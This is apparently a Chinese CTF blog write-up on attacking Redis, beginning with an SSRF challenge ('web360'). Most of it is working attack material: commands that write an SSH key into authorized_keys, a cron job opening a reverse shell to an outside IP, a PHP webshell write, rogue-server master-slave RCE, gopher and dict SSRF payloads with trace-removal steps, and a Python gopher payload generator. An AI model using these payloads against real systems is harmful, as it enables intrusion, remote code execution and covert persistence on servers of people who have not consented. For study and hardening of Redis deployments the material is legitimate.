---
title: redis
date: 2023-10-19 23:20:01
categories:
- 网络安全
tags:
- web 
description: |
    测,redis
---

## redis

web360

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

什么是Redis未授权访问？

Redis 默认情况下，会绑定在 `0.0.0.0:6379`，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 `/root/.ssh` 文件夹的 `authotrized_keys` 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器

简单说，漏洞的产生条件有以下两点：

- redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网
- 没有设置密码认证（一般为空），可以免密码远程登录redis服务

### redis未授权访问漏洞

Redis是一种key-value键值对的非关系型数据库

默认情况下绑定在127.0.0.1:6379，在没有进行采用相关的策略，如添加防火墙规则避免其他非信任来源ip访问等，Redis服务将会暴露到公网上，以及在没有设置密码认证的情况下，会导致任意用户在可以访问目标服务器的情况下进行未授权的访问Redis

Redis还支持本地存储，也就导致任意文件写入，攻击者在未授权访问以root身份运行的Redis时可将ssh公钥写入目标服务器/root/.ssh文件夹的authotrized_keys 文件中，进而通过对应私钥直接登录目标服务器

> 漏洞条件
>
> Redis绑定在127.0.0.1:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略
>
> 没有设置密码认证，可以免密码远程登录Redis服务
>
> 以root身份运行Redis

```bash
查看版本信息
127.0.0.1:6379> info
清空所有Redis数据库的所有key 慎用
127.0.0.1:6379> flushall
设置Redis本地存储的文件夹和文件名
127.0.0.1:6379> config set dir [PATH]
127.0.0.1:6379> config set dbfilename [FILENAME]
将当前Redis实例所有数据快照以RDB文件的形式保存到硬盘
127.0.0.1:6379> save

```

Redis.config简单配置了解

- `bind IP1 IP2 ...`

  bind表示本机可以接受连接的网卡地址；只有通过bind里面配置的IP才访问到Redis服务

- `protected-mode [no|yes]`

  设置protected-mode no此时外部网络可以直接访问；开启保护模式需配置bind IP或者设置访问密码

首先目标机

```bash
# bind 127.0.0.1
protected-mode no
需要允许除本地外的主机远程连接redis服务
sudo redis-server /etc/redis.conf
```

攻击机

```bash
root@kali:~# ssh-keygen -t rsa

root@kali:~/.ssh# cat id_rsa.pub

root@kali:~/.ssh# redis-cli -h ip

ip:6379> config set dir /root/.ssh
ip:6379> config set dbfilename authorized_keys
ip:6379> set x "\n\n\nxxxxxxx\n\n\n"         # \n换行，不然SSH连接会失败 x为id_rsa_pub内容
ip:6379> save


root@kali:~/.ssh# ssh -i id_rsa root@ip
```

也可以结合frp内网渗透,具体看moectf里的压轴

#### redis反弹shell

```bash
ip:6379> set x "\n* * * * * /bin/bash -i > /dev/tcp/107.172.141.31/9999 0<&1 2>&1\n"
ip:6379> config set dir /var/spool/cron/
ip:6379> config set dbfilename root
ip:6379> save
```

由于系统的不同，定时文件位置也不同

- Centos的定时任务文件在`/var/spool/cron/root`
- Ubuntu定时任务文件在`/var/spool/cron/crontabs/root`
- 二者共有定时任务文件在`/etc/crontab`

Redis以root身份写的文件权限为644，普通用户则是664，但Ubuntu要求在`/var/spool/cron/crontabs/`中执行定时任务的文件权限必须是600，而如果写入`/etc/crontab`

由于存在乱码,因此ubuntu不能正确执行定时任务

而CentOS在`/var/spool/cron/`中的定时任务文件权限为644就能执行

#### 利用Redis写入WebShell

当redis-server以非root身份运行时，无法将/var/spool/cron/以及/root/.ssh设置为本地存储文件夹但可以写入一句话木马

```bash
ip:6379> set x "<?php phpinfo();?>"
OK
ip:6379> config set dir /var/www/html
OK
ip:6379> config set dbfilename shell.php
OK
ip:6379> save
OK

```

还有gopher打redis就不说了

### redis主从复制rce

> 又学到一招,感谢X1r0z

首先`git clone https://github.com/Dliv3/redis-rogue-server.git`

一般都是被动啊

#### 主动

```bash
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

就行了

参数说明：

- –rpasswd 如果目标Redis服务开启了认证功能，可以通过该选项指定密码
- –rhost 目标redis服务IP
- –rport 目标redis服务端口，默认为6379
- –lhost vps的外网IP地址
- –lport vps监控的端口，默认为21000

#### 被动

`python3 redis-rogue-server.py --server-only`

本地端口21000,我自己起了个重定向的python服务

接下来有两个协议,一个是dict 另一个是gopher

- gopher

  这个会比较轻松,因为可以执行多条命令,但是要双url什么的

  等wp

  看起来像

  ```bash
  #设置文件名，连接恶意Redis服务器
  gopher://127.0.0.1:6379/_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520*107.172.141.31*%2520*21000*%250d%250aquit
  # * 记得去掉
  #加载exp.so，反弹shell
  gopher://127.0.0.1:6379/_module%2520load%2520./exp.so%250d%250asystem.rev%2520*107.172.141.31*%2520*9999*%250d%250aquit
  ```

- dict

  只能一条条执行

  ```bash
  1.设置保存文件名
  curl dict://127.0.0.1:6381/config:set:dbfilename:exp.so
  2.连接远程主服务器
  curl dict://127.0.0.1:6381/slaveof:107.172.141.31:21000
  #执行slaveof的时候就已经开始同步文件了,所以需要设置文件名在第一步
  3.载入 exp.so
  curl dict://127.0.0.1:6381/module:load:./exp.so
  4.断开主从
  curl dict://127.0.0.1:6381/slaveof:no:one
  5.恢复原始文件名
  curl dict://127.0.0.1:6381/config:set:dbfilename:dump.rdb
  6.执行命令
  curl dict://127.0.0.1:6381/system.exec:'whomai'
  7.删除痕迹
  curl dict://127.0.0.1:6381/system.exec:rm './exp.so
  ```

### 有认证的ssrf攻击

放个脚本先

```py
import urllib.parse

def tranToResp(x):
        xSplit = x.split(" ")
        cmd=""
        cmd+="*"+str(len(xSplit))
        for i in xSplit:
            i = i.replace("${IFS}"," ")
            cmd+="\r\n"+"$"+str(len(i))+"\r\n"+ i
        cmd+="\r\n"
        return cmd

def GeneratePayload(ip, port):
    cmd=[
     "config set dir ./",
     "config set dbfilename exp.so",
     "slaveof {i} {p}".format(i=ip, p=port),
     "module load exp.so",
     "system.exec ls",
     "system.exec rm${IFS}exp.so",
     "quit",
     ]
     # "system.exec bash${IFS}-i${IFS}>&${IFS}/dev/tcp/192.168.8.103/4607${IFS}0>&1",
    payload = ""
    for p in cmd:
        payload += urllib.parse.quote(tranToResp(p))
    return payload


def main():
    # target
    ip = "127.0.0.1"
    port = "6383"
    # server load exp.so
    serverIp = "101.x.x.x"
    serverPort = "21000"
    authPass = "123123"
    payload = GeneratePayload(serverIp, serverPort)
    exitPayload = (urllib.parse.quote(tranToResp("slaveof no one") + tranToResp("quit") ))
    if authPass:
        print("author attack:")
        pd = "gopher://{host}:{port}/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24{l}%0d%0a{p}%0d%0a"
        pd = pd.format(host=ip, port=port, l=str(len(authPass)), p=authPass)
        print(pd + payload)
        print("clean footprint:")
        print(pd + exitPayload)
    else:
        print("no author attack:")
        pd = "gopher://{host}:{port}/_"
        print(pd.format(host=ip, port=port)+payload)
        print("clean footprint:")
        print(pd.format(host=ip, port=port) + exitPayload)

if __name__ == '__main__':
    main()

```

想要有验证的话更改authpass就好
